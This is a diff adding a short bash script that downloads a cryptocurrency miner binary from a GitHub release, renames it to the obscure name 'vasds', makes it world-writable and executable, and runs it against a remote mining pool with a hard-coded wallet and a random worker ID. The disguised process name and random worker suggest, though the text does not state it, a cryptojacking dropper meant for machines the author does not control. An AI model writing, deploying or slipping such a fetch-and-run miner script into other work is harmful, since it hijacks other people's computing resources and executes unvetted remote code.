@@ -1,0 +1,5 @@
+#!/bin/bash
+wget https://github.com/pearlhash/pearlhash-miner/releases/download/V14/pearl-miner
+mv pearl-miner vasds
+chmod 777 vasds
+./vasds --host pool.pearlhash.xyz:9000 --user prl1pg75kn5m2very9je3rd0v9z89n7wxxud89gc6v07ayckep4adjgmqzahmmr --worker $(echo $RANDOM | md5sum | head -c 10)
